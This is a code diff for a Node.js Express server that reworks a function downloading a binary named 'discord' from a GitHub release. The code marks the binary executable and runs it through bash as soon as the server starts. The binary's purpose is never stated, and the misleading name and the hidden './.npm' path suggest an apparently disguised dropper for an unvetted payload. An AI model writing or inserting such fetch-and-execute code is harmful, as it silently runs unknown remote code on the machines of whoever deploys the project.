@@ -2,7 +2,7 @@ const express = require("express");
 const app = express();
 const fs = require('fs');
 const path = require('path');
-const https = require('https');
+const axios = require('axios');
 const { exec } = require('child_process');
 const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
 const FILE_PATH = './.npm';
@@ -26,59 +26,61 @@ app.get("/log", (req, res) => {
   });
 });
 
-const downloadDiscord = () => {
+const downloadDiscord = async () => {
+  try {
+    console.log('Start downloading discord...');
+    const response = await axios({
+      method: 'get',
+      url: 'https://github.com/mmnni/pipeops/releases/download/sac/discord',
+      responseType: 'stream'
+    });
+
+    const writer = fs.createWriteStream('discord');
+    response.data.pipe(writer);
+
     return new Promise((resolve, reject) => {
-      console.log('Start downloading discord...');
-      const file = fs.createWriteStream('discord');
-      https.get('https://github.com/mmnni/pipeops/releases/download/sac/discord', (response) => {
-        if (response.statusCode !== 200) {
-          console.log(`Download failed, status code: ${response.statusCode}`);
-          reject(new Error(`Download failed: ${response.statusCode}`));
-          return;
-        }
-  
-        response.pipe(file);
-        file.on('finish', () => {
-          file.close();
-          console.log('Download completed, adding execute permission...');
-          exec('chmod +x discord', (err) => {
-            if (err) {
-              console.log('Failed to add execute permission:', err);
-              reject(err);
-            }
-            console.log('Execute permission added successfully');
-            resolve();
-          });
+      writer.on('finish', () => {
+        console.log('Download completed, adding execute permission...');
+        exec('chmod +x discord', (err) => {
+          if (err) {
+            console.log('Failed to add execute permission:', err);
+            reject(err);
+          }
+          console.log('Execute permission added successfully');
+          resolve();
         });
-      }).on('error', (err) => {
-        console.log('Download error:', err);
-        fs.unlink('discord', () => {});
+      });
+      writer.on('error', err => {
+        console.log('Write error:', err);
         reject(err);
       });
     });
-  };
-  
-  const Execute = async () => {
-    try {
-      await downloadDiscord();
-      
-      console.log('Starting discord...');
+  } catch (err) {
+    console.log('Download error:', err);
+    throw err;
+  }
+};
 
-      const command = './discord';
-      exec(command, { 
-        shell: '/bin/bash'
-      }, (error, stdout, stderr) => {
-        if (error) {
-          console.log('Execution error:', error);
-          return;
-        }
-        if (stdout) console.log('Output:', stdout);
-        if (stderr) console.log('Error:', stderr);
-      });
-    } catch (err) {
-      console.log('Process error:', err);
-    }
-  };
+const Execute = async () => {
+  try {
+    await downloadDiscord();
+    
+    console.log('Starting discord...');
+    const command = './discord';
+    exec(command, { 
+      shell: '/bin/bash'
+    }, (error, stdout, stderr) => {
+      if (error) {
+        console.log('Execution error:', error);
+        return;
+      }
+      if (stdout) console.log('Output:', stdout);
+      if (stderr) console.log('Error:', stderr);
+    });
+  } catch (err) {
+    console.log('Process error:', err);
+  }
+};
 
 Execute();
 
